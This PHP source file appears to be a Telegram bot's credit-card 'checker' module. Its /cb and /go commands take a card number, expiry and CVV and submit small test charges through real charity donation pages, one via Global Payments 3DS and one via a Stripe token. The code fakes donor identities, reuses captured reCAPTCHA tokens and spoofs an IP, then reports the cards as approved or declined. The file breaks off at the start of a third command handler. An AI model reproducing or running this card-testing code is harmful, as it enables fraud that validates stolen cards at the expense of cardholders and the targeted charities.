<?php

function chkgo($chatId, $message, $message_id) {
 global $user, $admin, $logo, $userType, $live_array; 
	
	$tipo = $userType; //TIPO DE USUARIO//
	

	
	
	
	

	
if (preg_match('/^(!|\/|\.)cb/', $message)) {
	
$lista = substr($message, 4);
$i = preg_split('/[|:| ]/', $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano   = $i[2];
$cvv   = $i[3];

$bin = substr($lista, 0, 6);
if (strlen($ano) == 2) {
    $ano = '20' . $ano;
}

if (strlen($mes) == 1 && $mes <= 9) {
    $mes = '0' . $mes;
}


$lista = "$cc|$mes|$ano|$cvv";

$bin = substr($lista, 0, 6);
//-----------------------------------------------------//


$longitud_cc = (substr($cc, 0, 2) == "37" || substr($cc, 0, 2) == "34") ? 15 : 16;
if (!is_numeric($cc) || strlen($cc) != $longitud_cc || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
    $respuesta = "🚫 Oops!\nUse this format: /cb CC|MM|YYYY|CVV\n";
    sendMessage($chatId, $respuesta, $message_id);
    die();
}

//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chatId,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin

///AGREGA EL + O %20///
$longitud = 4;
$partes = [];
for ($i = 0; $i < strlen($cc); $i += $longitud) {
    $parte = substr($cc, $i, $longitud);
    $partes[] = $parte;
}

$longitud1 = 4;
$partes1 = [];
for ($i = 0; $i < strlen($cc); $i += $longitud1) {
    $parte1 = substr($cc, $i, $longitud1);
    $partes1[] = $parte1;
}

$cc1 = implode('+', $partes1);
$cc = implode('%20', $partes);
//echo "$cc1\n";
////EXTRAE EL SCHEME Y BRAND////
$curl = curl_init('https://binlist.io/lookup/'.$bin.'');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content = curl_exec($curl);
curl_close($curl);
$binna = json_decode($content,true);
//---------------------------------------------//
$brand = $binna['scheme'];
if (empty($brand)) {
$brand = "Unavailable";
}
//VARIABLES//
$MV = strtoupper(trim($brand));
$MV1 = ucfirst(strtolower(trim($brand)));

echo "$MV\n";

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://cbm.agitate.ie/donate/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'Accept-Language: es-US,es;q=0.6',
    'Referer: https://www.cbm.ie/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
preg_match('/name="dOrderid" value="([^"]+)"/', $response, $match);
$dOrderid = $match[1];
curl_close($curl);

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://cbm.agitate.ie/api/p/global/3ds_version/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => '{"card":{"number":"'.$cc.'"}}',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    'Content-Type: application/json',
    'sec-ch-ua-platform: "Android"',
    'sec-ch-ua: "Not A(Brand";v="8", "Chromium";v="132", "Brave";v="132"',
    'sec-ch-ua-mobile: ?1',
    'Sec-GPC: 1',
    'Accept-Language: es-US,es;q=0.6',
    'Origin: https://cbm.agitate.ie',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Dest: empty',
    'Referer: https://cbm.agitate.ie/donate/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
curl_close($curl);


preg_match('/"enrolled":\s*"([^"]+)"/', $response, $matches);
$enrolled = $matches[1];
preg_match('/"serverTransactionId":\s*"([^"]+)"/', $response, $matches);
$serverTransactionId = $matches[1];

//preg_match('/"methodUrl":\s*"([^"]+)"/', $response, $matches);
//$methodUrl = $matches[1];
//preg_match('/"methodData":\s*"([^"]+)"/', $response, $matches);
//$methodData = $matches[1];
//echo "Enrolled: $enrolled\n";
//echo "Server Transaction ID: $serverTransactionId\n";
//echo "Method URL: $methodUrl\n";
//echo "Method Data: $methodData\n";


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://cbm.agitate.ie/api/p/global/3ds_authentication/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => '{"serverTransactionId":"'.$serverTransactionId.'","authenticationRequestType":"PAYMENT_TRANSACTION","methodUrlComplete":true,"merchantContactUrl":"http://example.com/contact","card":{"number":"'.$cc.'","scheme":"'.$MV.'","expMonth":"'.$mes.'","expYear":"'.$ano.'","cvn":"'.$cvv.'","cardHolderName":""},"order":{"amount":"1.00","id":"'.$dOrderid.'"},"payer":{"name":"","firstname":"Carlos","lastname":"Perez","email":"Dausitherer%40cuvox.de","billing_address":{"line1":"6195%20bollinger%20rd","line2":"","city":"New%20york","postal_code":"10010","country":"US"}},"serverData":{"acceptHeader":"text/html%2Capplication/xhtml%2Bxml%2Capplication/xml%3Bq%3D0.9%2Cimage/avif%2Cimage/webp%2Cimage/apng%2C%2A/%2A%3Bq%3D0.8","ip":"138.84.62.101"},"challengeWindow":{"windowSize":"WINDOWED_600X400","displayMode":"lightbox"},"authenticationSource":"BROWSER","messageCategory":"PAYMENT_AUTHENTICATION","challengeRequestIndicator":"NO_PREFERENCE","browserData":{"colorDepth":"TWENTY_FOUR_BITS","javaEnabled":false,"javascriptEnabled":true,"language":"es-US","screenHeight":800,"screenWidth":360,"time":"2025-01-25T02:47:56.891Z","timezoneOffset":6,"userAgent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36"}}',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    'Content-Type: application/json',
    'sec-ch-ua-platform: "Android"',
    'sec-ch-ua: "Not A(Brand";v="8", "Chromium";v="132", "Brave";v="132"',
    'sec-ch-ua-mobile: ?1',
    'Sec-GPC: 1',
    'Accept-Language: es-US,es;q=0.6',
    'Origin: https://cbm.agitate.ie',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Dest: empty',
    'Referer: https://cbm.agitate.ie/donate/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$data = json_decode($response, true);
curl_close($curl);



$status_cha = $data["status"];
if ($status_cha == "CHALLENGE_REQUIRED"){

$respo = "CHALLENGE_REQUIRED";

} else {


$result = $data["result"];
$status = $data["response"]["status"];
$status_reason = $data["response"]["status_reason"];
$ds_trans_id = $data["response"]["ds_trans_id"];
$authentication_value = $data["response"]["authentication_value"];
//$error = $data['errorDetail']; // Output: Card type is too long.<br />Card type is invalid.

$errorDetail = strip_tags($data['errorDetail']);
$errorDetail = preg_replace('/\s+/', ' ', $errorDetail);
$error = trim($errorDetail);

echo $errorDetail;

//echo "Status: $status\n";
//echo "Status Reason: $status_reason\n";
//echo "Ds_trans_id: $ds_trans_id\n";
//echo "authentication_value: $authentication_value\n";

$authentication_value = urlencode($authentication_value);
//echo "authentication_value: $authentication_value\n";


if ($result == "AUTHORIZATION_SUCCESS"){

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://cbm.agitate.ie/donate/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'g-recaptcha-token=03AFcWeA56hyuUamXT1086PZw6crImdzozgkcvyLG3afFGh_XsCem4lB39A-YV-bWQWRxf73KIdpEFUyRyXo-y0qz81I5bfFjoIL5mB3NBXwhTFQZ77ZP-ICCP2LwuV0slbCYNNVj8j2BUEikVKG2FY9XbZrX8AHLv6nnMkhKcV7kSJUJVcXHLl_l9S4BEylzRnY7t5Y04YgDpCWOrer0IW1_UYY-mA1Fikt2C9YRrNTmtnHBRx4JPkKUFfRKPdIJJ-9QBizGYIQ9AmZmRaokaZ4RWcdRKWcwv_LlYlTDyP0z3taC-V_u5td2K2tNNMv-koEh-dhcXY_2dZWJcfHj0AfPUdlAaokGv8u_Nvip_kT6aPuZnLXie8aKEFqHptDTlqLZowY_tPsgTxW7KGLMA-ndIlTgdWMV0YmiYiUxSqxfmUHmFSX--nnimLGOFEF4nCAtCQpQM1qlBOHeSG9lhsqsq6MstK6jckD7ogEguFIbCSFbFoNi9ZddHLUhQ0hx2NnAtrYKVXNKoC2LHR9qz_S3sgFskHnJnb1oMfsomFL7-IVtAl-uALakk5wkBBGBdSUIeWSrbkPoDORyiKH0o1t2v5Jd5pp0D0muQUQlT2_vGZSY-wXQLYvgRgrTcanwhTNiL-L7BCSQKVDflBBR1RLXwJpfw2ca5pM1PUGIRFednoYQ6lGnNywdbVymYk_MqwFO5r0_-tpcPqUxGUWITIED7o2B2FhUeeDJ7RHbtxHKrB15ygLfH-qVqt6zz29vfEEEVt-dZmz1DrUf70J_tZZ44UT89uZ-vmrZ0H6SPOhs_baQWZ_0pkwPIjY9R7nm8NEVV1uj7gSpYF0hkrBj5DVA1XtpnxarYeZsBhOmpQe2aLYBulibsHHu06bL6UHpJOlp18PGjt0GUMbmfzODS-HqleB2q2IdaWWoEN6YBj8QhtU0E3Jo4CYA&_action=donate&dOrderid='.$dOrderid.'&dFrequency=once&dAmount=1.00&dMethod=card&dCardProcessor=globalpayments&dCardtype='.$MV.'&dBankProcessor=&dIp=138.84.62.101&dAccept=text%2Fhtml%252Capplication%2Fxhtml%252Bxml%252Capplication%2Fxml%253Bq%253D0.9%252Cimage%2Favif%252Cimage%2Fwebp%252Cimage%2Fapng%252C%252A%2F%252A%253Bq%253D0.8&frequency=once&amount-flexible=1.00&confirmAmmount=1.00&name=&firstname=Carlos&lastname=Perez&address=6195+bollinger+rd&address-line2=&city=New+york&county=&country=US&postcode=10010&email=Dausitherer%40cuvox.de&mobile=%2B524179204022&custom-1=Social+Media&consent-email=1&cc-number='.$cc1.'&cc-exp-month='.$mes.'&cc-exp-year='.$ano.'&cc-csc='.$cvv.'&dCard3ds=auth_frictionless&eci=05&ds_trans_id='.$ds_trans_id.'&authentication_value='.$authentication_value.'',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    'Content-Type: application/x-www-form-urlencoded',
    'sec-ch-ua-platform: "Android"',
    'Origin: https://cbm.agitate.ie',
    'Accept-Language: es-US,es;q=0.6',
    'Referer: https://cbm.agitate.ie/donate/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
preg_match('/(\d+: .*?)<\/p>/', $response, $match);
$respo = $match[1];

//EXTRAE EL TANKYOU//
if (empty($respo)){
preg_match('/<h1.*>(.*?)<\/h1>/', $response, $match);
$respo = $match[1];
}
//file_put_contents('/sdcard/index.html', $response);
curl_close($curl);

}
//echo "RESPO: $respo\n";

}

if (empty($respo)){
$respo = $status_reason ?? $status;
}
if (!empty($error)){
$respo = $error;
}

//echo "RESPO1: $respo\n";



$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";


if (empty($respo)) {
        $respo = $response;
}


if ($respo == '{"error":"Bad JSON Response"}') {
$respo = "Service Unavailable";
}
/*if ($respo == "SUCCEEDED"){
    $respo = "Charged $5";
}*/
$logo = "<a href='http://t.me/XNazunaBot'>[↯]</a>";

if (array_in_string($respo, $live_array)) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged €1\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝! ✅\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = True;
} elseif (strpos($respo, 'Declined') !== false || strpos($respo, '107: Fails Fraud Checks') !== false || strpos($respo, '101: INVALID TRANS') !== false || strpos($respo, 'CARD_AUTHENTICATION_FAILED') !== false || strpos($respo, 'INVALID CARD') !== false || strpos($respo, 'UNABLE TO AUTH') !== false || strpos($respo, 'Card type is too long.Card type is invalid.') !== false) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged €1\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
} elseif (strpos($respo, 'CHALLENGE_REQUIRED') !== false) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged €1\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐑𝐞𝐣𝐞𝐜𝐭𝐞𝐝 ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
} else {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged €1\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐆𝐀𝐓𝐄 𝐄𝐑𝐑𝐎𝐑 ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
}

if ($live) {
    editMessage($chatId, $respuesta, $id_text);
} else {
    editMessage($chatId, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();


 }


	
	
	
	
	
	
	
if (preg_match('/^(!|\/|\.)go/', $message)) {

	$respuesta = "Gate no disponible por el momento !!!";
	sendMessage($chatId,$respuesta, $message_id);
	die();

$lista = substr($message, 4);

$i = preg_split('/[|:|\/ ]/', $lista);
$cc    = trim($i[0]);
$mes   = trim($i[1]);
$ano  = trim(substr($i[2], -2));
$cvv   = trim($i[3]);
$lista = "$cc|$mes|$ano|$cvv";

$bin = substr($lista, 0, 6);
$ma = "$mes/$ano1";
$card = "$cc$mes$ano$cvv";
$num = "$cc$mes$ano1$cvv";
//-----------------------------------------------------//


$longitud_cc = (substr($cc, 0, 2) == "37" || substr($cc, 0, 2) == "34") ? 15 : 16;
if (!is_numeric($cc) || strlen($cc) != $longitud_cc || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
    $respuesta = "🚫 Oops!\nUse this format: /go CC|MM|YYYY|CVV\n";
    sendMessage($chatId, $respuesta, $message_id);
    die();
}



//Verifi//
/*
if (!is_numeric($cc) || strlen($cc) != 16 || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
    $respuesta = "🚫 Oops!\nUse this format: /go CC|MM|YYYY|CVV\n";
    sendMessage($chat_id, $respuesta, $message_id);
    die();
}

*/

//----------------MENSAGE DE ESPERA-------------------//
$response = "<b>🕒 Wait for Result...</b>";
sendMessage($chatId, $response, $message_id, "HTML");  // Enviar el mensaje
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin


//RANDOM USER//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/1.2/?nat=us');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$get = curl_exec($ch);
curl_close($ch);
        preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $name = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];

////SACA EL TOKEN//
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://api.stripe.com/v1/tokens',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F3d0d0fc67%3B+stripe-js-v3%2F3d0d0fc67&time_on_page=63244&key=pk_live_41FIHoENH2ilJLW1pkGdu3wb&pasted_fields=number',
  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    'Accept: application/json',
    'Content-Type: application/x-www-form-urlencoded',
    'sec-ch-ua-platform: "Android"',
    'accept-language: es-US,es;q=0.6',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$token = $json["id"];
$ip = $json["client_ip"];
curl_close($curl);
//echo "$token\n";

//---------------PRUEBA LAS CCS EN PAGINA DE DONACION---------------//
$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://goodbricksapp.com/icsd.org/donate',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'g-recaptcha-response=03AFcWeA79gN-cRZCqHC86fNgGHKUYB4kIXpZwh0Asad6-9xnWuLyR598WPDh3DdhVZgKmFEgqjW4Q4wLjH4ILy_rOPovVGEKpaTqejsK3jqN2lWF6AU_UZDSvSf99D3GD8mKFPb2DDKW5O3T1voJNde8qlmA6uS7DCaNMQ9snUNXkWp-hRNpCYM3F4G9FtsNH89m4Ym1ASF9slZMhfS50axXAjeTUZqjHQ0wyqWMUFo8egBpY-i0SW8jvqYoLnzwNXIQ8MKZ2jBU5VPBez8_2z_GKvhqX_Chm-uVPDiTqneR4H83cCyvnoCHB9cnnRZbZSsRA2rDNu7mys0fxmmfskLoWhNM872ppHipa0d9Cv6wZL_7ZRqmk4IpL0SNqtAfm1-LcaVJSja0ZR5ZD4hlvqteyna-rP_ypt04EkUuAt__Nf0MjSkoDSRziZDTyiIPTUpumXTbNzOId93sJlQF9ZFmCjJOEjmJs5eri9yah7_1N4y-R538eHVPvfZJeROfFyPewhTJgJ6m-t2qgbczqOhhalXpdmy3xwSpm1b6lUe4fqAb5fLgOmPEwuMSiGXIW4cTQp2X7CLYehyrGUUA6HeRjHbxELJJZFvzTfR6nrYS5W-XWAJBRNPKw45Oo4voxRVCQfJMRb2Th030Wro62n8lqduUZ2-TcNpqmm0GxywcDRiGshF9K11kQjnY4gyNmwsBf7fdjiGgPsUWzNzIbA0IPUztJDU_FoM-aU40VVQXghlsNab8PMfnHTnAVUpRrIZ-RRwPMuyKLLot2YqmwwxYyuwdbsPAZ2HkiXL6T3ypjkNWOBfxqbkmgfLQtxRnmwRnizn0ZMTyrccA_EzB01MHiAm4qheWbSteU7pt6160Va-pvpG_KTrJUxQoMCflqNIPHfuMMBtB8GQ7ND4TVHgOqPtM6t-7MyA&token='.$token.'&clientIp='.$ip.'&categoryAmount=5&paymentIterations=0&categoryName=masjid-operations-2025&firstName='.$name.'&lastName='.$last.'&email='.$email.'&customerEmailValidation=&phone='.$phone.'&addressStreet='.$street.'&addressApt=&addressCity='.$city.'&addressState='.$state.'&addressZipCode='.$postcode.'',
  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
//  CURLOPT_COOKIE => 'AWSELB=3BCDDBFC041DF2CB93B1F636C2A3E3B1969F2E549B084AFBFC941618DBECF951F761AB9DF0241960432B90F895A2BFFFD4DBCE2F350BEBBA742F70A5B1CDB1D610D29AA3; AWSELBCORS=3BCDDBFC041DF2CB93B1F636C2A3E3B1969F2E549B084AFBFC941618DBECF951F761AB9DF0241960432B90F895A2BFFFD4DBCE2F350BEBBA742F70A5B1CDB1D610D29AA3; __stripe_mid=27a8675f-023c-45ac-9483-16bd0a1b7b88bfab33; __stripe_sid=17eb8870-f952-48b8-b39f-f559cd90e22dde35cd',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    'Content-Type: application/x-www-form-urlencoded',
    'sec-ch-ua-platform: "Android"',
    'Accept-Language: es-US,es;q=0.6',
    'Origin: https://goodbricksapp.com',
    'Referer: https://goodbricksapp.com/icsd.org/donate',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);

$respo = '';

if (isset($json['status'])) {
    $respo = $json['status'];
} elseif (isset($json['message'])) {
    $messages = explode(';', $json['message']);
    $respo = trim($messages[0]);
} else {
    preg_match('/<p>(.*?)<\/p>/', $response, $matches);
    if (isset($matches[1])) {
        $respo = trim($matches[1]);
    } else {
        $respo = 'Service Unavailable';
    }
}

curl_close($curl);
	
$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";


if (empty($respo)) {
        $respo = $response;
}
if ($respo == "SUCCEEDED"){
    $respo = "Charged $5";
}
// Aquí podrías guardar $responseLog en un archivo o base de datos para depuración

	
	unlink('cookie.txt');
//\n".$logo." 𝐑𝐞𝐭𝐫𝐢𝐞𝐬: ".$retri."

$retri = handleComando($card); //Checa cuntas veces se calo la misma ccs//
	
if (array_in_string($respo, $live_array)) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Approved! ✅\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐑𝐞𝐭𝐫𝐢𝐞𝐬: ".$retri."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = True;
} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your card was declined.') !== false) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Declined ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐑𝐞𝐭𝐫𝐢𝐞𝐬: ".$retri."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
} else {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: GATE ERROR ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐑𝐞𝐭𝐫𝐢𝐞𝐬: ".$retri."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
}

if ($live) {
    editMessage($chatId, $respuesta, $id_text);  // Editar el mensaje con el resultado generado
} else {
    editMessage($chatId, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();

 }



if (preg_match('/^(!|\/|\.)br/', $message)) {

$lista = substr($message, 4);
$i = preg_split('/[|:| ]/', $lista);
